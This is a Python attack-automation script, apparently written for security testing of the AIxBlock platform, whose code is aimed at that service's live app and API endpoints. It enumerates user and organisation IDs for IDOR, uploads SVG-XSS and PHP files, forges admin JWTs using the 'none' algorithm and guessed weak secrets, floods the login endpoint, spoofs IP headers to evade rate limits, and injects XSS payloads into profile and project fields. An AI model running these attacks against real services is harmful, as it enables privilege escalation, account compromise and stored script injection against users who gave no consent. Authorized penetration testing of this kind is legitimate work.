#!/usr/bin/env python3
"""
AIxBlock Security Testing Automation Script
Execute this after setting up your test accounts and session cookies
"""

import requests
import json
import time
import threading
from urllib.parse import urljoin
import jwt
import base64

class AIxBlockSecurityTester:
    def __init__(self, base_url="https://app.aixblock.io", api_url="https://api.aixblock.io"):
        self.base_url = base_url
        self.api_url = api_url
        self.session = requests.Session()
        self.vulnerabilities_found = []
        
    def set_session_cookies(self, cookies_dict):
        """Set session cookies for authenticated testing"""
        self.session.cookies.update(cookies_dict)
        
    def log_vulnerability(self, vuln_type, severity, description, poc):
        """Log discovered vulnerabilities"""
        vuln = {
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'proof_of_concept': poc,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.vulnerabilities_found.append(vuln)
        print(f"[{severity}] {vuln_type}: {description}")
        
    def test_idor_vulnerabilities(self):
        """Test for Insecure Direct Object Reference vulnerabilities"""
        print("\n=== Testing IDOR Vulnerabilities ===")
        
        # Test organization access
        org_endpoints = [
            "/api/organizations/{id}",
            "/api/organizations/{id}/members",
            "/api/organizations/{id}/settings",
            "/api/organizations/{id}/projects"
        ]
        
        test_ids = [1, 2, 3, 100, 999, 1000, 9999]
        
        for endpoint_template in org_endpoints:
            for org_id in test_ids:
                endpoint = endpoint_template.format(id=org_id)
                url = urljoin(self.api_url, endpoint)
                
                try:
                    response = self.session.get(url)
                    if response.status_code == 200:
                        # Check if response contains sensitive data
                        if any(keyword in response.text.lower() for keyword in 
                               ['email', 'phone', 'address', 'private', 'secret']):
                            self.log_vulnerability(
                                "IDOR - Organization Access",
                                "HIGH",
                                f"Can access organization {org_id} data via {endpoint}",
                                f"GET {url} returns sensitive data"
                            )
                except Exception as e:
                    print(f"Error testing {url}: {e}")
                    
        # Test user profile access
        user_endpoints = [
            "/api/users/{id}",
            "/api/users/{id}/profile",
            "/api/users/{id}/projects",
            "/api/users/{id}/settings"
        ]
        
        for endpoint_template in user_endpoints:
            for user_id in test_ids:
                endpoint = endpoint_template.format(id=user_id)
                url = urljoin(self.api_url, endpoint)
                
                try:
                    response = self.session.get(url)
                    if response.status_code == 200:
                        if any(keyword in response.text.lower() for keyword in 
                               ['email', 'phone', 'personal', 'private']):
                            self.log_vulnerability(
                                "IDOR - User Profile Access",
                                "HIGH", 
                                f"Can access user {user_id} profile via {endpoint}",
                                f"GET {url} returns personal information"
                            )
                except Exception as e:
                    print(f"Error testing {url}: {e}")
                    
    def test_file_upload_vulnerabilities(self):
        """Test file upload security"""
        print("\n=== Testing File Upload Vulnerabilities ===")
        
        # SVG XSS payload
        svg_xss = '''<?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
        "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
           <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
           <script type="text/javascript">
              alert('XSS_VULNERABILITY_DETECTED');
           </script>
        </svg>'''
        
        # Test different upload endpoints
        upload_endpoints = [
            "/api/upload",
            "/api/files/upload", 
            "/upload",
            "/api/projects/upload",
            "/api/datasets/upload"
        ]
        
        for endpoint in upload_endpoints:
            url = urljoin(self.api_url, endpoint)
            
            # Test SVG XSS
            files = {'file': ('xss_test.svg', svg_xss, 'image/svg+xml')}
            try:
                response = self.session.post(url, files=files)
                if response.status_code in [200, 201]:
                    self.log_vulnerability(
                        "File Upload - SVG XSS",
                        "HIGH",
                        f"SVG file with XSS uploaded successfully to {endpoint}",
                        f"POST {url} with malicious SVG file"
                    )
            except Exception as e:
                print(f"Error testing SVG upload to {url}: {e}")
                
            # Test PHP file upload
            php_payload = "<?php echo 'PHP_EXECUTION_TEST'; ?>"
            files = {'file': ('test.php', php_payload, 'application/x-php')}
            try:
                response = self.session.post(url, files=files)
                if response.status_code in [200, 201]:
                    self.log_vulnerability(
                        "File Upload - PHP Upload",
                        "CRITICAL",
                        f"PHP file uploaded successfully to {endpoint}",
                        f"POST {url} with PHP file"
                    )
            except Exception as e:
                print(f"Error testing PHP upload to {url}: {e}")
                
    def test_authentication_bypass(self):
        """Test authentication and authorization bypass"""
        print("\n=== Testing Authentication Bypass ===")
        
        # Test JWT manipulation if JWT tokens are used
        auth_header = self.session.headers.get('Authorization')
        if auth_header and 'Bearer' in auth_header:
            token = auth_header.split('Bearer ')[1]
            self._test_jwt_manipulation(token)
            
        # Test admin endpoints without proper authorization
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/organizations", 
            "/api/admin/settings",
            "/api/admin/stats",
            "/admin",
            "/api/superuser"
        ]
        
        for endpoint in admin_endpoints:
            url = urljoin(self.api_url, endpoint)
            try:
                response = self.session.get(url)
                if response.status_code == 200:
                    self.log_vulnerability(
                        "Authorization Bypass - Admin Access",
                        "CRITICAL",
                        f"Can access admin endpoint {endpoint} without proper authorization",
                        f"GET {url} returns admin data"
                    )
            except Exception as e:
                print(f"Error testing admin endpoint {url}: {e}")
                
    def _test_jwt_manipulation(self, token):
        """Test JWT token manipulation"""
        try:
            # Decode without verification
            decoded = jwt.decode(token, options={"verify_signature": False})
            
            # Test privilege escalation
            escalated_claims = decoded.copy()
            escalated_claims['role'] = 'admin'
            escalated_claims['is_superuser'] = True
            escalated_claims['permissions'] = ['*']
            
            # Test with no signature (algorithm: none)
            try:
                none_token = jwt.encode(escalated_claims, '', algorithm='none')
                headers = {'Authorization': f'Bearer {none_token}'}
                response = requests.get(f"{self.api_url}/api/admin/users", headers=headers)
                
                if response.status_code == 200:
                    self.log_vulnerability(
                        "JWT - Algorithm None Attack",
                        "CRITICAL",
                        "JWT accepts 'none' algorithm allowing privilege escalation",
                        f"Modified JWT with 'none' algorithm grants admin access"
                    )
            except Exception:
                pass
                
            # Test with weak secrets
            weak_secrets = ['secret', 'key', 'aixblock', 'password', '123456', '']
            for secret in weak_secrets:
                try:
                    weak_token = jwt.encode(escalated_claims, secret, algorithm='HS256')
                    headers = {'Authorization': f'Bearer {weak_token}'}
                    response = requests.get(f"{self.api_url}/api/admin/users", headers=headers)
                    
                    if response.status_code == 200:
                        self.log_vulnerability(
                            "JWT - Weak Secret",
                            "CRITICAL", 
                            f"JWT uses weak secret '{secret}' allowing token forgery",
                            f"Forged JWT with secret '{secret}' grants admin access"
                        )
                        break
                except Exception:
                    continue
                    
        except Exception as e:
            print(f"JWT manipulation test error: {e}")
            
    def test_rate_limiting(self):
        """Test rate limiting implementation"""
        print("\n=== Testing Rate Limiting ===")
        
        # Test login endpoint rate limiting
        login_url = urljoin(self.api_url, "/api/auth/login")
        
        # Test concurrent requests (race condition)
        def make_login_request(thread_id):
            data = {'username': 'invalid_user', 'password': 'invalid_pass'}
            try:
                response = requests.post(login_url, json=data)
                return response.status_code
            except:
                return 0
                
        # Launch 50 concurrent requests
        threads = []
        results = []
        
        for i in range(50):
            thread = threading.Thread(target=lambda: results.append(make_login_request(i)))
            threads.append(thread)
            thread.start()
            
        for thread in threads:
            thread.join()
            
        # Check if any requests succeeded (should be rate limited)
        success_count = sum(1 for status in results if status not in [429, 0])
        if success_count > 10:  # Allow some requests but not all
            self.log_vulnerability(
                "Rate Limiting - Insufficient Protection",
                "MEDIUM",
                f"{success_count}/50 concurrent requests succeeded",
                "Concurrent login attempts bypass rate limiting"
            )
            
        # Test IP header bypass
        bypass_headers = [
            {'X-Forwarded-For': '1.1.1.1'},
            {'X-Real-IP': '2.2.2.2'}, 
            {'X-Originating-IP': '3.3.3.3'},
            {'Client-IP': '4.4.4.4'}
        ]
        
        for headers in bypass_headers:
            bypass_success = 0
            for i in range(20):
                try:
                    response = requests.post(login_url, 
                                           json={'username': 'test', 'password': 'test'},
                                           headers=headers)
                    if response.status_code != 429:
                        bypass_success += 1
                except:
                    pass
                    
            if bypass_success > 15:  # Most requests succeeded
                self.log_vulnerability(
                    "Rate Limiting - IP Header Bypass",
                    "MEDIUM",
                    f"Rate limiting bypassed using {list(headers.keys())[0]} header",
                    f"20 requests with {headers} bypassed rate limiting"
                )
                
    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        print("\n=== Testing XSS Vulnerabilities ===")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        # Test common input fields
        test_endpoints = [
            ("/api/profile/update", {"name": "PAYLOAD", "bio": "PAYLOAD"}),
            ("/api/projects/create", {"title": "PAYLOAD", "description": "PAYLOAD"}),
            ("/api/organizations/update", {"name": "PAYLOAD", "description": "PAYLOAD"}),
            ("/api/search", {"query": "PAYLOAD"})
        ]
        
        for endpoint, data_template in test_endpoints:
            url = urljoin(self.api_url, endpoint)
            
            for payload in xss_payloads:
                test_data = {}
                for key, value in data_template.items():
                    test_data[key] = value.replace("PAYLOAD", payload)
                    
                try:
                    response = self.session.post(url, json=test_data)
                    
                    # Check if payload is reflected in response
                    if payload in response.text and response.status_code == 200:
                        self.log_vulnerability(
                            "Reflected XSS",
                            "HIGH",
                            f"XSS payload reflected in {endpoint}",
                            f"POST {url} with payload: {payload}"
                        )
                        
                    # Check if payload might be stored (would need manual verification)
                    if response.status_code in [200, 201]:
                        print(f"Potential stored XSS in {endpoint} - manual verification needed")
                        
                except Exception as e:
                    print(f"Error testing XSS in {url}: {e}")
                    
    def generate_report(self):
        """Generate vulnerability report"""
        print("\n" + "="*50)
        print("VULNERABILITY ASSESSMENT REPORT")
        print("="*50)
        
        if not self.vulnerabilities_found:
            print("No vulnerabilities detected in automated testing.")
            print("Manual testing may still reveal issues.")
            return
            
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        
        for vuln in self.vulnerabilities_found:
            severity_counts[vuln['severity']] += 1
            
        print(f"\nSUMMARY:")
        print(f"Critical: {severity_counts['CRITICAL']}")
        print(f"High: {severity_counts['HIGH']}")
        print(f"Medium: {severity_counts['MEDIUM']}")
        print(f"Low: {severity_counts['LOW']}")
        
        print(f"\nDETAILED FINDINGS:")
        for i, vuln in enumerate(self.vulnerabilities_found, 1):
            print(f"\n{i}. {vuln['type']} ({vuln['severity']})")
            print(f"   Description: {vuln['description']}")
            print(f"   PoC: {vuln['proof_of_concept']}")
            print(f"   Found: {vuln['timestamp']}")
            
        # Save to file
        with open('vulnerability_report.json', 'w') as f:
            json.dump(self.vulnerabilities_found, f, indent=2)
            
        print(f"\nFull report saved to: vulnerability_report.json")
        
    def run_all_tests(self):
        """Execute all security tests"""
        print("Starting AIxBlock Security Assessment...")
        print("Make sure you have set session cookies with set_session_cookies()")
        
        self.test_idor_vulnerabilities()
        self.test_file_upload_vulnerabilities() 
        self.test_authentication_bypass()
        self.test_rate_limiting()
        self.test_xss_vulnerabilities()
        
        self.generate_report()

if __name__ == "__main__":
    # Initialize tester
    tester = AIxBlockSecurityTester()
    
    # Set your session cookies here after logging in
    # Example: tester.set_session_cookies({'sessionid': 'your_session_id'})
    print("SETUP REQUIRED:")
    print("1. Login to AIxBlock platform")
    print("2. Get your session cookies from browser")
    print("3. Update the cookies in this script")
    print("4. Run: python3 automated_testing.py")
    
    # Uncomment and update with your actual session cookies
    # tester.set_session_cookies({
    #     'sessionid': 'your_session_id_here',
    #     'csrftoken': 'your_csrf_token_here'
    # })
    # tester.run_all_tests()